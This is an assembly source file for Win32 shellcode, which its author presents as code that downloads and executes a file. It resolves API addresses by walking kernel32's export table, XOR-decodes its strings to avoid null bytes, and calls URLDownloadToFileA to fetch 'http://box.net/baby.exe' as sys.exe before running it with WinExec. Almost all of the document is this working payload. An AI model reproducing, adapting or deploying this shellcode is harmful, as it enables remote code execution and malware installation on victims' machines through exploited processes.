; Win32 shellcode I wrote a few years ago that downloads and executes a file without using hardcoded addresses, instead is searches the address space to find function addresses.
;
; (c) Enrique Compañ

.386
.model flat, stdcall

option casemap:none

include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
includelib \masm32\lib\kernel32.lib
include \masm32\include\user32.inc
includelib \masm32\lib\user32.lib

.data

data db "blah"


.code


shell_code_start:


        jmp fix_long_jmp             ;Jump to call back function

call_back:

        pop esi                      ;ESI = first var offset


real_code_start:

 mov ebp, esp       ;Normalize the stack

 mov eax, [esi]               ;eax = ptr to "MZ" (Kernel Base)
 xor ax, ax

 mov ebx, eax                 ;ebx = ptr to "MZ"
 add eax, [eax+3ch]      ;eax = ptr to "PE"
 mov eax, [eax+78h]      ;eax = export tables RVA
 add eax, ebx       ;eax = ptr to export tables
 mov edi, [eax+20h]      ;edi = names tables RVA
 lea edi, [edi+ebx]      ;edi = names table ptr

; Ex table = 77ed5c20
; Names tables with RVAs of names = 77ed6f92

 add ebx, [edi]
 xor edx, edx
 xor ecx, ecx

search_function:

 inc ebx
 cmp [ebx], dl
 jne  no_zero
 inc  ecx
no_zero:
 cmp [ebx], DWORD PTR 'PteG'
 jne no_match
 cmp [ebx+4], DWORD PTR 'Acor'
        jne no_match
        je  search_complete
no_match:
 jmp search_function

search_complete:

 push eax
 inc ecx
 xor eax, eax
 mov al, 4
 mul ecx
 mov ecx, eax
 pop eax
 add eax, ecx
 add eax, 024h
 push [esi+2]
 push word ptr [eax]
 pop ebx       ;EBX = GetProcAddress address... finally!

; Decode the NULL chars

 push esi
        add esi, 4

decode_loop:
 inc esi
 cmp byte ptr [esi], 0ffh
 jne skip_xor
 xor byte ptr [esi], 0ffh
skip_xor:
 cmp [esi], dword ptr 'EKIK'
 jne decode_loop

;Trick to avoid Nulls in the first jmp instruction...

 jmp skip_fix_long_jmp       ;Skipt the special jump
fix_long_jmp:
 jmp pi_offset      ;Continue the jump to the call back function
skip_fix_long_jmp:

;Now we Download & Execute the file and terminate

 pop esi

 mov esp, ebp      ;Normalize ESP

 mov eax, [esi]              ;eax = ptr to "MZ" (Kernel Base)
 xor ax, ax

 push eax

 add esi, 4
 push esi
 push eax
        call ebx      ;Call GetProcAddress

 add esi, 13
 push esi
 call eax      ;Call LoadLibraryA

 add esi, 7
 push esi
 push eax
 call ebx      ;Call GetProcAddress

 xor ecx, ecx
 push ecx
 push ecx
 add esi, 19
 push esi
 add esi, 28
 push esi
 push ecx      ;Call URLDownloadToFileA
 call eax

 pop eax
 push eax
 sub esi, 8
 push esi
 push eax
 call ebx             ;Call GetProcAddress

 xor ecx, ecx
 push ecx
 sub esi, 20
 push esi
 call eax      ;Call WinExec

 pop eax
 add esi, 8
 push esi
 push eax
 call ebx             ;Call GetProcAddress

xor ecx, ecx
push ecx
call eax             ;Call ExitProcess

real_code_end:


pi_offset:
        call call_back              ;Return and push the address of the vars

vars_start:

 db 0ffh,0ffh,0e8h,077h      ;Specify the Kernel Base @ 77e80000h
 db "LoadLibraryA",0ffh
 db "URLMON",0ffh
 db "URLDownloadToFileA",0ffh
 db "sys.exe",0ffh
 db "ExitProcess", 0ffh
 db "WinExec",0ffh
 db "http://box.net/baby.exe",0ffh           ;The URL: Be sure to end it
with 0ffh
db "KIKE",0h                                       ;Marker to know we
reached the END

end shell_code_start
